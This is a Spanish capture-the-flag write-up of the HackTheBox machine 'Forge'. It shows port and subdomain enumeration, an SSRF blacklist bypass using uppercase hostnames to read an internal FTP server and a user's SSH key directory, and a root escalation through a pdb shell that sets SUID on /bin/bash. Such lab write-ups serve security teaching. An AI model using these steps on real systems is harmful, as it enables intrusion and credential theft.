---
title: "Forge - HTB Writeup"
layout: single
excerpt: "Forge es una máquina de dificultad media de la plataforma de HackTheBox. En esta máquina de un SSRF para obtener una acceso inicial. Para escalar privilegios abusamos de un script en python el cual podíamos ejecutar como root"
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/67548295/150680333-3d03847c-2659-4de9-bf22-f1580e88b94b.png
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - SSRF
  - Misconfiguration
  - Python
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/150680583-a9145b13-4192-4d60-a8d0-df927c45772d.png)

# Enumeración

Empezamos con la fase de enumeración enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina víctima con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.11.111
PING 10.10.11.111 (10.10.11.111) 56(84) bytes of data.
64 bytes from 10.10.11.111: icmp_seq=1 ttl=63 time=69.5 ms

--- 10.10.11.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 69.491/69.491/69.491/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

### Nmap

Usamos la herramienta **Nmap** para llevar a cabo una enumeración de puertos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.111 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 13:31 WET
Nmap scan report for 10.10.11.111
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Una vez finalizado el escaneo, podemos distinguir dos puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | Corresponde al protocolo [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | Este puerto pertenece al protocolo [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Empezamos enumerando el **sitio web** alojado en el **puerto 80**, ya que no vemos nada relevante en el puerto 22.

Uso la utilidad `whatweb` para enumerar las tecnologías en uso del servidor:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb http://10.10.11.111
http://10.10.11.111 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
IP[10.10.11.111], RedirectLocation[http://forge.htb], Title[302 Found]

ERROR Opening: http://forge.htb - no address for forge.htb
```
Vemos que se usa **Apache** en un sistema **Ubuntu**.

Además podemos ver que se aplica una **redirección** al host `forge.htb`, esto es un indicio de que probablemente se esté aplicando [Virtual Hosting](https://linube.com/ayuda/articulo/267/que-es-un-virtualhost){:target="\_blank"}{:rel="noopener nofollow"} en el servidor.

Para poder resolver este nombre de dominio es necesario incorporarlo al archivo `/etc/hosts` de la siguiente forma:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ cat /etc/hosts
10.10.11.111  forge.htb
```
Una vez hecho esto, podremos visualizar el sitio web desde el navegador utilizando este nombre de dominio

![image](https://user-images.githubusercontent.com/67548295/150681524-df7df256-0f18-4204-9957-46cf7c178855.png)

---

Pruebo a enumerar subdominios del dominio principal `forge.htb` con la herramienta `wfuzz`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ wfuzz -c --hc=404 --hw=26 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.forge.htb" -u http://forge.htb -t 50

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forge.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000024:   200        1 L      4 W        27 Ch       "admin"                                                                                                                     
                                                                                                                   
Total time: 0
Processed Requests: 307
Filtered Requests: 306
Requests/sec.: 0
```

| Parámetro | Acción |
|:---------:|:-------|
| `-c` | Reporta el output del programa con colores |
| `--hc` | Acrónimo de _hide code_ que sirve para ocultar respuestas según su código de estado |
| `--hw` | Acrónimo de _hide word_ el cual sirve para ocultar respuestas segun el número de palabras que contengan estas |
| `-w` | Este parámetro sirve para especificar un diccionario con el cual se _fuzzeará_ |
| `-H` | Con este parámetro, podemos especificar _headers_ para las peticiones
| `-u` | Parámetro usado para especificar el target |
| `FUZZ` | Esta palabra la deberemos colocar donde queramos que la herramienta _fuzzee_ |
| `-t` | Este parametro hace referencia a la palabra _threads_ y sirve para enviar peticiones simultaneamente haciendo el _fuzzeo_ más rápido |

Conseguimos descubrir un subdominio con nombre `admin`. Bien, añadamoslo al archivo `/etc/hosts` para poder acceder a él.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ cat /etc/hosts
# Host addresses
127.0.0.1     localhost
127.0.1.1     z3r0byte
10.10.11.111  forge.htb admin.forge.htb
```
![image](https://user-images.githubusercontent.com/67548295/150682085-2f9b9649-2ae8-4f1e-a4ad-d1cc363085cd.png)

Parece que el acceso está limitado únicamente a peticiones desde el **lado del servidor.**

Bien, continuando con la enumeración del sitio web en el **dominio principal**, encuentro un **hipervínculo** con un nombre que llama la atención.

![image](https://user-images.githubusercontent.com/67548295/150682257-77befb34-e2c3-48dc-b504-bffd11c93c31.png)

Al pulsar ahí, nos lleva a este recurso.

![image](https://user-images.githubusercontent.com/67548295/150682304-ff49692d-529f-4a8f-bc18-38d6b0079a20.png)

Todas las posibilidades de subir cualquier archivo **PHP** para RCE se desvanecen ya que el servidor no interpreta el lenguaje PHP.

Así que me centro la opción "_Upload from url_".

Tras descubrir el subdominio `admin` y ver que solo era accesible mediante el lado del servidor, al ver esta opción para introducir una URL se me viene a la cabeza la vulnerabilidad [SSRF](https://empresas.blogthinkbig.com/como-funciona-server-side-reques/){:target="\_blank"}{:rel="noopener nofollow"}.

Esta vulnerabilidad ocurre cuando el atacante puede acceder a recursos internos mediante peticiones desde el lado del servidor.

 Mi teoría es que si en el campo donde se nos permite ingresar una URL, ponemos `http://admin.forge.htb`, **el servidor** realizará una petición a ese recurso y lo podremos ver.
 
 Probemos esto: 
 
 ![image](https://user-images.githubusercontent.com/67548295/150683348-d6bc4404-865e-49a3-b7d1-b61cb46a8778.png)
 
 Vaya, parece que esta URL esta en una **lista negra**, es decir, no se nos permitirá introducir esta url.
 
 Tras pasar un buen rato intentando hacer un **bypass** a este _blacklist_, lo consigo usando ***mayúsculas**.
 
 Con solo poner `http://ADMIN.FORGE.HTB` ya conseguimos bypassear esto.
 
 ![image](https://user-images.githubusercontent.com/67548295/150683888-decd7a2c-edd2-4700-8157-5d9e1ba60546.png)
 
 Al intentar acceder a esta URL mediante el navegador observamos lo siguiente:
 
 ![image](https://user-images.githubusercontent.com/67548295/150683961-9c8014e6-ac32-4ea5-9909-8173168c956b.png)
 
 El navegador trata este recurso como una imagen e intenta mostrarla.
 
 Para poder ver el recurso, podemos utilizar la herramienta `curl`:
 
 ```bash
 ┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://forge.htb/uploads/2MJlQVhl70UaSKwW1aE3
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```
¡Ha funcionado!, estamos viendo el contenido HTML del subdominio `admin`.

Podemos ver dos rutas en el código fuente, `announcements` y `upload`.

Veamos primero el recurso `announcements`, para ello hay que seguir los pasos anteriores pero añadiendo la ruta a la URL, de esta forma:

![image](https://user-images.githubusercontent.com/67548295/150685318-1f396319-a551-43a0-bc1a-462f1dbd3da0.png)

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://forge.htb/uploads/MvbRv9Uv2wRfO9P0Hwht
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:XXXXXXXXXXXXXX</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

Podemos ver varias cosas aquí. La primera es que nos dicen que se ha montado un servidor **FTP** de forma interna y nos dan credenciales para el mismo.

La segunda es que también se nos dice que en la ruta `upload` del subdominio `admin` se ha habilitado la funcionalidad de **FTP**

Y por último, nos hacen saber que han configurado la ruta `upload` para poder subir archivos con el **parámetro GET** '`u`'.

Con toda esta información está claro que podemos intentar acceder al FTP desde el panel de subida de archivos del subdominio `admin`.

Para hacer esto, la url que tendríamos que introducir quedaría tal que así: 

> `http://ADMIN.FORGE.HTB/upload?u=ftp://user:PASSWORD@FORGE.HTB/` # Cambia la contraseña

Probemos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://forge.htb/uploads/cG9uemTqesBoClcw4r0R
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 23 13:16 user.txt
```
¡Está funcionando!, a partir de aquí podremos visualizar la flag `user.txt` añadiendo el nombre de este archivo a la URL expuesta arriba.

# Root.txt

Al ver que conseguíamos ver la flag `user.txt`, la cual siempre suele estar en el directorio `home` de un usuario, pensé en intentar acceder al directorio `.ssh` para ver si existía:

> `http://ADMIN.FORGE.HTB/upload?u=ftp://user:PASSWORD@FORGE.HTB/.ssh/` # Cambia la contraseña
>  
```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://forge.htb/uploads/3MLSIIr0gtmYCswsMKnC
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```
Vemos que el directorio `.ssh` existe y además contiene claves de **SSH**.

Con la clave privada `id_rsa` podríamos acceder al sistema sin proporcionar contraseña.

Obtengamos esta clave:

> `http://ADMIN.FORGE.HTB/upload?u=ftp://user:PASSWORD@FORGE.HTB/.ssh/id_rsa` # Cambia la contraseña

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl http://forge.htb/uploads/J0l7iZ8D1172NtXOU4F6
-----BEGIN OPENSSH PRIVATE KEY-----

Do it by yourself

-----END OPENSSH PRIVATE KEY-----
```
Bien, tenemos una **clave privada** de SSH, pero no sabemos de que usuario.

Solo sabemos la existencia de un usuario y es `user`, probemos a iniciar sesión con este.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ssh -i id_rsa user@10.10.11.111
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 23 Jan 2022 04:00:18 PM UTC

  System load:  0.0               Processes:             218
  Usage of /:   43.8% of 6.82GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ 
```
¡Hemos conseguido acceso al sistema!, hora de escalar privilegios.

---

Enumero por encima el sistema como el usuario `user` y me doy cuenta de que tenemos un permiso asignado:

```bash
user@forge:~$ sudo -l 
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```
Este permiso nos deja ejecutar el script `/opt/remote-manage.py` como cualquier usuario.

Bien, veamos como se compone este script:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```
Analizando el programa, concluyo que crea un **socket** en un puerto aleatorio y se queda en escucha de conexiones entrantes, a estas conexiones entrantes se les pide una contraseña que esta escrita en texto plano en el código, si esta es correcta, se despliega un menú de utilidades, de lo contrario, se sale del programa.

Busqué formas de aprovecharnos de este script para escalar privilegios ejecutandolo como root y encontre una.

Resulta que se ha implementado la función `post_mortem()` de `pdb` la cual hace que se inicie una shell interactiva de **pdb** cuando el programa falla.

En la shell interactiva de **pdb** se pueden importar modulos e interpretar código en `python`.

Seguro ya te estarás imaginando como escalaremos privilegios.

Bien, hagamos esto por pasos:

##### 1º Paso - Ejecutamos el programa como root

```bash
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:17131
```

##### 2º Paso - Iniciamos sesión con SSH desde otra terminal

Iniciamos sesión como el usuario `user` desde otra terminal y nos conectamos al socket que haya creado el script, en mi caso, el programa ha utilizado el puerto `17131`.

```bash
user@forge:~$ nc localhost 17131
Enter the secret passsword: 
```

##### 3º Introducimos la contraseña y hacemos que el programa falle

Introducimos la contraseña, esta esta _hardcodeada_ en el script y es: `secretadminpassword`

```bash
user@forge:~$ nc localhost 17131
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```
Ahora haremos que el programa falle, haremos esto pulsando `ctrl + c`.

```bash
user@forge:~$ nc localhost 17131
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
^C
user@forge:~$ 
```
Ahora si miramos en la otra terminal, veremos queya tendremos la shell interactiva de **pdb**. 

##### 4º Paso - Asignar permisos SUID a /bin/bash

Para obtener acceso como root, una de las formas que se me ocurre es dar permisos SUID a `/bin/bash`

Haremos esto de la siguiente forma:

```bash
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:49345
user@forge:~$ sudo -u root /usr/bin/python3 /opt/remote-manage.py                                                                                                                            Listening on localhost:17131
invalid literal for int() with base 10: b''
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system("chmod u+s /bin/bash")
```
---

Ahora para acceder como root introduciremos el siguiente comando:

> `bash -p`

```bash
user@forge:~$ bash -p
bash-5.0# whoami
root
```
A partir de aquí ya podremos ver la flag `root.txt` en el directorio `/root/root.txt`

```bash
bash-5.0# head --bytes 12 /root/root.txt | xargs
413d017e947d
```
# Conclusión

En esta máquina hemos explotado un **SSRF** para conseguir una **clave privada de SSH** para obtener acceso inicial. Luego de esto, nos aprovechamos de un script mal planteado el cual podíamos ejecutar como usuario **root** para escalar privilegios.












